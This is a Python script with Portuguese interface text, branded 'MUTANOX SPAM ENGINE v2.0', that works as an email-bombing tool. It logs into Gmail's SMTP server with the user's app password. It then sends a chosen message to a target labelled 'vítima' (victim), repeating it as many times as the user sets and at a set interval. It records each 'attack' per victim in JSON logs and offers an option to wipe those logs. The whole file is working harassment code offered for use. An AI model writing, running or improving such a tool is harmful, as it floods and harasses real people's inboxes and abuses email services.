#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ██████╗ ██╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗████████╗██╗ ██████╗ ███╗   ██╗
# ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
# ██████╔╝██║   ██║███████╗   ██║   ███████║██║     ██║   ██║   ██║██║   ██║██╔██╗ ██║
# ██╔═══╝ ██║   ██║╚════██║   ██║   ██╔══██║██║     ██║   ██║   ██║██║   ██║██║╚██╗██║
# ██║     ╚██████╔╝███████║   ██║   ██║  ██║███████╗██║   ██║   ██║╚██████╔╝██║ ╚████║
# ╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
# >>> MUTANOX SPAM ENGINE v2.0 <<< — By MutanoX

import os, json, smtplib, time, datetime
from email.mime.text import MIMEText
from pathlib import Path

# █▀▀ █▀█ █▀▄▀█ █▀▀ █▄░█ ▀█▀ █▀█ █▀█
# █▄▄ █▄█ █░▀░█ ██▄ █░▀█ ░█░ █▀▄ █▄█

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear_screen()
    print("\033[1;92m")
    print(r"  ███▄ ▄███▓ ▄▄▄       ██▓     ██▓    ▓█████▄  ██▓ ▄▄▄       ███▄ ▄███▓")
    print(r" ▓██▒▀█▀ ██▒▒████▄    ▓██▒    ▓██▒    ▒██▀ ██▌▓██▒▒████▄    ▓██▒▀█▀ ██▒")
    print(r" ▓██    ▓██░▒██  ▀█▄  ▒██░    ▒██░    ░██   █▌▒██▒▒██  ▀█▄  ▓██    ▓██░")
    print(r" ▒██    ▒██ ░██▄▄▄▄██ ▒██░    ▒██░    ░▓█▄   ▌░██░░██▄▄▄▄██ ▒██    ▒██ ")
    print(r" ▒██▒   ░██▒ ▓█   ▓██▒░██████▒░██████▒░▒████▓ ░██░ ▓█   ▓██▒▒██▒   ░██▒")
    print(r" ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░ ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░ ▒░   ░  ░")
    print(r" ░  ░      ░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░░  ░      ░")
    print(r" ░      ░     ░   ▒     ░ ░     ░ ░    ░ ░  ░  ▒ ░  ░   ▒   ░      ░   ")
    print(r"        ░         ░  ░    ░  ░    ░  ░   ░     ░        ░  ░       ░   ")
    print(r"                                  ░     ░                              ")
    print("\033[0m")
    print(f"\033[1;96m> > > BEM-VINDO, MUTANOX — INICIANDO SISTEMA DE ATAQUE CIBERNÉTICO\033[0m\n")
    time.sleep(1.5)

def print_menu():
    clear_screen()
    print_banner()
    print("\033[1;93m" + "═"*60 + "\033[0m")
    print(" \033[1;97m[1] \033[1;92mLISTAR VÍTIMAS & ESTATÍSTICAS")
    print(" \033[1;97m[2] \033[1;91mINICIAR ATAQUE SPAM")
    print(" \033[1;97m[3] \033[1;94mLIMPAR LOGS")
    print(" \033[1;97m[0] \033[1;95mSAIR")
    print("\033[1;93m" + "═"*60 + "\033[0m")

def load_config():
    if not Path("database.json").exists():
        print("\033[1;31m [!] database.json não encontrado. Criando arquivo base...\033[0m")
        base_config = {
            "email": "seu_email@gmail.com",
            "password": "sua_senha_de_app"
        }
        with open("database.json", "w", encoding="utf-8") as f:
            json.dump(base_config, f, indent=4, ensure_ascii=False)
        print("\033[1;33m [!] Preencha o 'database.json' com seu e-mail e senha de aplicativo e reinicie.\033[0m")
        input("\033[1;37m Pressione Enter para sair...\033[0m")
        exit()

    with open("database.json", encoding="utf-8") as f:
        return json.load(f)

def ensure_victim_file(victim_email):
    filename = f"victims/{victim_email.replace('@', '_at_').replace('.', '_dot_')}.json"
    Path("victims").mkdir(exist_ok=True)
    if not Path(filename).exists():
        initial_data = {
            "email": victim_email,
            "total_spam_sent": 0,
            "attack_log": []
        }
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(initial_data, f, indent=4, ensure_ascii=False)
        print(f"\033[1;36m [+] Arquivo de vítima criado: {filename}\033[0m")
    return filename

def update_victim_log(victim_email, count, interval_sec):
    filename = ensure_victim_file(victim_email)
    with open(filename, "r+", encoding="utf-8") as f:
        data = json.load(f)
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data["total_spam_sent"] += count
        data["attack_log"].append({
            "timestamp": now,
            "quantity": count,
            "interval_seconds": interval_sec
        })
        f.seek(0)
        json.dump(data, f, indent=4, ensure_ascii=False)
        f.truncate()
    print(f"\033[1;32m [✓] Log atualizado para {victim_email}\033[0m")

def list_victims():
    clear_screen()
    print_banner()
    print("\033[1;96m> > > LISTAGEM DE VÍTIMAS\033[0m\n")
    
    victim_dir = Path("victims")
    if not victim_dir.exists() or not any(victim_dir.iterdir()):
        print("\033[1;33m [!] Nenhuma vítima registrada ainda.\033[0m")
        input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
        return

    for file in victim_dir.glob("*.json"):
        with open(file, encoding="utf-8") as f:
            data = json.load(f)
            print("\033[1;93m" + "─"*50 + "\033[0m")
            print(f" \033[1;97m📧 EMAIL: \033[1;92m{data['email']}")
            print(f" \033[1;97m💣 TOTAL SPAM ENVIADO: \033[1;91m{data['total_spam_sent']}")
            print(f" \033[1;97m📅 ÚLTIMO ATAQUE: \033[1;93m{data['attack_log'][-1]['timestamp'] if data['attack_log'] else 'Nunca'}")
    print("\033[1;93m" + "─"*50 + "\033[0m")
    input("\n\033[1;37m Pressione Enter para voltar...\033[0m")

def clear_logs():
    clear_screen()
    print_banner()
    print("\033[1;96m> > > LIMPANDO LOGS DE VÍTIMAS\033[0m\n")
    victim_dir = Path("victims")
    if victim_dir.exists():
        for file in victim_dir.glob("*.json"):
            file.unlink()
        print("\033[1;32m [✓] Todos os logs de vítimas foram apagados.\033[0m")
    else:
        print("\033[1;33m [!] Nenhum log encontrado.\033[0m")
    input("\n\033[1;37m Pressione Enter para voltar...\033[0m")

# █▀█ ▄▀█ █▀▄ █▀█ █▀ █▀▀ █▄░█ █▀
# █▀▄ █▀█ █▄▀ █▄█ ▄█ ██▄ █░▀█ ▄█

class SMTPSpammer:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.server = None

    def connect(self):
        try:
            self.server = smtplib.SMTP("smtp.gmail.com", 587)
            self.server.ehlo()
            self.server.starttls()
            self.server.login(self.email, self.password)
            print("\033[1;32m [✓] Conexão SMTP estabelecida com sucesso.\033[0m")
            return True
        except smtplib.SMTPAuthenticationError:
            print("\033[1;31m\n [!] Autenticação falhou. Verifique seu e-mail/senha de app.\033[0m")
            print("\033[1;33m [i] Senha de App: https://myaccount.google.com/apppasswords\033[0m")
            input("\033[1;37m Pressione Enter para sair...\033[0m")
            return False
        except Exception as e:
            print(f"\033[1;31m\n [!] Erro SMTP: {e}\033[0m")
            input("\033[1;37m Pressione Enter para sair...\033[0m")
            return False

    def disconnect(self):
        if self.server:
            self.server.quit()
            print("\033[1;32m [✓] Conexão SMTP encerrada.\033[0m")

    def send_single_email(self, victim, message):
        try:
            msg = MIMEText(message, 'plain', 'utf-8')
            subject = message.split("\n", 1)[0].replace("Assunto: ", "").strip() if "\n" in message else "Sem Assunto"
            msg['Subject'] = subject
            msg['From'] = self.email
            msg['To'] = victim

            self.server.sendmail(self.email, victim, msg.as_string())
            return True
        except Exception as e:
            print(f"\033[1;31m [!] Falha ao enviar: {e}\033[0m")
            return False

    def spam_attack(self, victim, message, total_count, interval_sec):
        clear_screen()
        print_banner()
        print(f"\033[1;91m> > > INICIANDO ATAQUE SPAM CONTRA: {victim}\033[0m")
        print(f"\033[1;93m    QUANTIDADE: {total_count} | INTERVALO: {interval_sec}s\033[0m\n")

        if not self.server:
            if not self.connect():
                return

        success_count = 0
        for i in range(1, total_count + 1):
            if self.send_single_email(victim, message):
                success_count += 1
                print(f"\033[1;32m [>] PACOTE {i}/{total_count} ENVIADO PARA {victim}\033[0m")
            else:
                print(f"\033[1;31m [!] PACOTE {i} FALHOU — TENTANDO RECONEXÃO...\033[0m")
                if not self.connect():
                    print("\033[1;31m [!] FALHA CRÍTICA — ATAQUE INTERROMPIDO.\033[0m")
                    break
            if i < total_count:  # Não espera após o último
                time.sleep(interval_sec)

        print(f"\n\033[1;96m> > > ATAQUE FINALIZADO — {success_count}/{total_count} PACOTES ENVIADOS\033[0m")
        update_victim_log(victim, success_count, interval_sec)
        input("\n\033[1;37m Pressione Enter para voltar...\033[0m")

# ▄▀█ █▀█ █▀█ █░█ █▀▀ █▀█
# █▀█ █▀▀ █▀▄ █▄█ ██▄ █▀▄

def start_spam_attack(config):
    clear_screen()
    print_banner()
    print("\033[1;96m> > > CONFIGURAÇÃO DE ATAQUE\033[0m\n")

    victim = input("\033[1;97m [?] Gmail da vítima: \033[0m").strip()
    if not victim or "@" not in victim:
        print("\033[1;31m [!] E-mail inválido.\033[0m")
        input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
        return

    message = []
    print("\033[1;97m [?] Digite a mensagem (digite 'FIM' em uma linha vazia para finalizar):\033[0m")
    while True:
        line = input("\033[1;90m   > \033[0m")
        if line.strip().upper() == "FIM":
            break
        message.append(line)
    message = "\n".join(message)

    try:
        total_count = int(input("\033[1;97m [?] Quantidade de mensagens: \033[0m"))
        if total_count <= 0:
            raise ValueError
    except ValueError:
        print("\033[1;31m [!] Quantidade inválida.\033[0m")
        input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
        return

    try:
        interval_input = input("\033[1;97m [?] Intervalo entre mensagens (1s a 3600s / 60min): \033[0m").strip()
        interval_sec = int(interval_input)
        if not (1 <= interval_sec <= 3600):
            raise ValueError
    except ValueError:
        print("\033[1;31m [!] Intervalo inválido. Use 1 a 3600 segundos.\033[0m")
        input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
        return

    spammer = SMTPSpammer(config["email"], config["password"])
    spammer.spam_attack(victim, message, total_count, interval_sec)
    spammer.disconnect()

# █▀▄ █▀▀ █░█ █▀█ █▀▀ █░░ ▄▀█ █▄░█ █▀▄
# █▄▀ ██▄ █▀█ █▀▄ ██▄ █▄▄ █▀█ █░▀█ █▄▀

def main():
    config = load_config()
    while True:
        print_menu()
        choice = input("\033[1;97m [?] Selecione uma opção: \033[0m").strip()

        if choice == "1":
            list_victims()
        elif choice == "2":
            start_spam_attack(config)
        elif choice == "3":
            clear_logs()
        elif choice == "0":
            print("\n\033[1;95m> > > OPERAÇÃO ENCERRADA — ATÉ A PRÓXIMA, MUTANOX.\033[0m\n")
            break
        else:
            print("\033[1;31m [!] Opção inválida.\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[1;95m> > > OPERAÇÃO INTERROMPIDA — SISTEMA DESATIVADO.\033[0m\n")
    except Exception as e:
        print(f"\n\033[1;31m [!] ERRO CRÍTICO: {e}\033[0m")
        input("\033[1;37m Pressione Enter para sair...\033[0m")
